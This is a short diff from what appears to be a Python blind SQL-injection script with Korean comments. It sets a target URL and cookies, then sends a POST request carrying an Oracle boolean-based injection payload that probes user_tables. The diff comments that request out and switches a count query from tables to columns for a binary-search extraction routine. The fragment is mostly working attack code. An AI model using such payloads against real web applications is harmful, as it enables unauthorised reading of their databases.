@@ -16,9 +16,9 @@ page.set_url(url)
 page.set_cookies(cookies)
 
 #쿼리 설정 및 요청 보내기(POST)
-page.send_post_request(request_string="%test' and (select count(TABLE_NAME) from user_tables)>0 and '1%'='1")
+#page.send_post_request(request_string="%test' and (select count(TABLE_NAME) from user_tables)>0 and '1%'='1")
 
 #기본 설정 보기 
 #page.show
-column_count_query = query.get_count_query('table')
+column_count_query = query.get_count_query('column')
 #binary_search(page,column_count_query)
